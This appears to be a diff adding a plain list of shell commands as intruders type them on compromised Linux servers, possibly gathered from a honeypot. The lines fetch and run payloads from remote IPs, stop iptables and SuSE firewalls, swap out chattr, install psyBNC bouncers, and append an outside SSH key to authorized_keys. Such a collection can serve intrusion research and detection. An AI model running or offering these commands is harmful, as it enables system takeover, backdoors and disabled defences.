@@ -1,0 +1,86 @@
+id
+uname -s -v -n
+chmod 0755 /usr/bin/chattr
+uptime
+uname -a
+wget cross-panel.tk/scan/y.txt
+perl y.txt
+ls /usr/bin/chattr  |  |  mv /usr/bin/hast /usr/bin/chattr
+w
+cat /proc/cpuinfo
+ls -a
+cd /var/tmp
+wget
+tar
+screen -r
+ifconfig
+apt-egt
+apt-get install python-paramiko
+apt-get install screen
+wget prg.do.am/scan/python.tgz
+tar zxvf python.tgz
+cd .python
+./all 76.45
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+wget -c http://173.254.230.67:9999/wslx
+wget http://112.74.66.152:280/.TSm
+chmod 0755 /root/.TSm
+wget http://89.248.172.166/.bash.sh -O /tmp/.bash.sh
+cd /tmp
+cat /proc/cpuinfocat /proc/cpuinfo
+wget angelfire.com/komales88/muh.tgz
+tar xvf muh.tgz
+rm -rf muh.tgz
+tar xvf muh.jpg
+tar zxvf muh.jpg
+cd /dev/shm
+ps x
+wget http://coxspeed.webs.com/psybnc-linuxRO.tgz
+wget http://www.psybnc.at/download/beta/psyBNC-2.3.2-7.tar.gz
+echo "WinSCP: this is end-of-file:0"
+wget -O /tmp/Maslss http://183.60.204.118:8080/Maslss
+wget http://183.60.204.118:8080/Maslss
+wget http://115.56.41.229:8099/mstaar
+chmod 0755 /root/yxdm.a
+nohup /root/yxdm.a >  /dev/null 2 > &1 &
+wget http://198.15.216.27:2015/xdsy
+ls
+history
+rm -rf /var/run/sftp.pid
+$filename  |  |  (filename="/6004.rar"
+cd /
+pwd
+rm -f $path*  |  |  /dev/null  >  $path
+for list in `echo http://211.110.1.32/ http://107.158.236.138/ `
+do (wget -O $filename $list$filename  |  |  curl -o $filename $list$filename)
+break
+cat /etc/hosts
+cd .ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIB8NTwrTVNx8KZwzNj067GiIfz8Vc2DgqvmEatkwH1hjiM/jdrq2VFEAJI75AIdarHo1jVL7ZcpsmiIJQ3Pi+P0JdAXARK8PJEZyRQJLJusucbJeU9FI4drnPceKKthaSjVl/9bWa6ckmrYaFIfnNZtAH9CAWn6TCGb5lDfKdgC5Q== X-remuser"  >  >  authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+mkdir "\,"
+cd "\,"
+cd ..
+cd ~
+tar xvzf 1.tgz
+wget ftp://honma:honma@210.225.196.37/1.tgz
+ftp 210.225.196.37
+wget mclucian.ucoz.ro/psy.tgz
+tar xvzf psy.tgz
+cd .bash
+rm -rf .bash
+./ntpd
+chmod +x *
+rm -rf "\,"
+cd /var
+ps
+echo 111 > 11
+tar xvf system2.jpg
+lscpu
+cd /root
+tar zxvf psybnc-linux.jpg
+wget -c http://121.40.51.232:11223/syn20160
